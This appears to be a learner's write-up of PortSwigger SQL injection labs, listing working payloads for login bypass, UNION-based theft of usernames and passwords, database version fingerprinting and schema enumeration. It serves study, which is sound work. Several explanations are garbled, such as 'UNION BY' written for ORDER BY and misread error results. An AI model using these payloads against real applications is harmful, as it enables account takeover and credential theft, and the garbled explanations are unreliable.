<div align="center">
  <h1>------------------------------ SQLi LABS 001 -------------------------------</h1>
</div>

# [CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Lab 1: `Retrieving hidden data`, where you can modify a SQL query to return additional results.
- Original Query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
- Modified: ![image](https://github.com/user-attachments/assets/e4236490-1079-4f23-92c9-a4097f63a50c)
- Query to executed by DB after injections: `SELECT * FROM products;`

### Injections:
- `'OR '1'='1` - This payload appends an OR condition that always evaluates to true.
- `'OR 1=1 --` - This payload appends an OR condition that always evaluates to true, commenting out the remaining portion of the original query.
- `'OR 'x'='x` - This payload compares a string with itself, resulting in a true condition.

## Lab 2: SQL injection vulnerability allowing `login bypass` [Link](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
- Original Query: `SELECT firstname FROM users WHERE username='administrator' AND password='p@ssw0rd'`
- Modified: `SELECT firstname FROM users WHERE username='administrator'--' AND password='admin'`
- Query to executed by DB after injections: `SELECT firstname FROM users;`

### Injections:
- `'admin'--'` - Commenting out the remaining portion of the original query.

## Lab 3: SQL injection UNION attack, determining the number of columns returned by the query
1. ' ORDER BY 1-- injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
- Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION BY 4--`
- Query to executed by DB after injections: `It should throw a Server side Error 500`

2. Submitting a series of `UNION SELECT` payloads specifying a different number of null values, will help in determining the columns unless we get the error.

- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
- Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL,NULL--`
- Query to executed by DB after injections: `It should throw a Server side Error 500`


## Lab 4: SQL injection UNION attack, finding a column containing text
- First, Determine the number of columns returned by the query.
- Second, Determine a column that is compatible with string data. 

- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
- Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+BY+4--` (Server Error, means number of columns = 3)
- Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+'a',NULL,NULL--` (Server Error, means this column accepting text value)
- Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+NULL,NULL,'a'--` (Server Error, means this column accepting text value)
- Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+NULL,'a',NULL--` ('a' determine that the 2nd column accepting text value)

## Lab 5: SQL injection UNION attack, `retrieving data from other tables` [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#)

- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
- Modified: `SELECT * FROM products WHERE category = 'Gifts'UNION+SELECT+username,password+FROM+users--` This should return all the users available in USERS table. (Since, table and columns name were given in Lab description. We can take it from there)
- Login > Enter the Administrator Cred > Done
- ![image](https://github.com/user-attachments/assets/003e7533-e7c9-401d-824d-fe7c7a34fe98)


## Lab 6: SQL injection UNION attack, retrieving multiple values in a single column [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
- Modified:
```
'Union+select+Null,NULL-- To determine the No. of columns

'Union+select+Null,'XYZ'-- To determine which column allows TEXT values

'Union+select+Null,username+from+users-- To retrieve Single TEXT value

'Union+select+Null,password+from+users-- To retrieve Single TEXT value

'Union+select+Null,username||password+from+users-- To retrieve Multiple TEXT value

'Union+select+Null,username||'~'||password+from+users-- To retrieve Multiple TEXT value with separator
```
- Login with Admin Creds to Solve the LAb
- ![image](https://github.com/user-attachments/assets/d73f2473-adfa-4ba2-beac-dfc914e9e354)

## Lab 7: SQL injection attack, querying the database type and version on Oracle `Union Query` [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
- On Oracle databases, every SELECT statement must specify a table to select FROM.
- If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
- There is a `built-in table on Oracle called 'dual'` For example: `UNION SELECT 'abc' FROM dual`

1. For Oracle:
- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
- Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'abc','def' FROM dual--`
- Query to executed by DB after injections: `SELECT * FROM products WHERE category = 'Gifts'' UNION SELECT 'abc','def' FROM dual--`
- To get the Oracle Version: `SELECT * FROM products WHERE category = 'Gifts'union+SELECT+banner,NULL+FROM+v$version--`

- Injections: `'union+SELECT+banner,NULL+FROM+v$version--` - Concate the second query with Union clause in Original Query.

2. For MYSQL:
- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
- Modified:
```
- 'UNION+SELECT+NULL,NULL#        Determine the Number of Columns, By comments it's MYSQL DB
- 'UNION+SELECT+@@version,'abc'#  Refer cheatsheet for cmd
- 'UNION+SELECT+@@version,+NULL#
```

## Lab 9: SQL injection attack, listing the database contents on non-Oracle databases [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
- A `Common set of views` available in Non-Oracle DBs to list out the tables in the database: `information_schema.tables` as `SELECT * FROM information_schema.tables`
- Also, To list the columns in individual tables: `information_schema.columns` as `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
- ![image](https://github.com/user-attachments/assets/bf84e527-c095-4c97-ab4f-eb516c8fd6da)

- Modified:
```
'UNION+SELECT+NULL,NULL-- To check the No. of Columns

'UNION+SELECT+version(),NULL--  To check DB version - Mysql

'Union+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables-- To return TABLE_NAME from information_schema.tables views

'UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_wifyly'-- To return column_name from information_schema.columns views

'UNION+SELECT+username_wcliss,password_ozuvxe+FROM+users_wifyly-- TO extract the info from table
```


/*The NEXT*/
